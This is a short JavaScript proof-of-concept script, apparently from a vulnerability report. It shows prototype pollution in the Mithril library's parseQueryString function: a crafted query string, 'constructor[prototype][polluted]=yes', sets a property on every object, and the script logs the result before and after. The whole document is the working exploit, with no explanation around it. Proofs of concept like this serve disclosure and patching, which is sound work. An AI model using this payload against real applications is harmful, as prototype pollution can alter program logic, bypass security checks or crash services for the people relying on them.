require('mithril/test-utils/browserMock')(global);
const m = require('mithril');
obj = {};
console.log({}.polluted);
m.parseQueryString('constructor%5Bprototype%5Bpolluted%5D=yes');
console.log({}.polluted);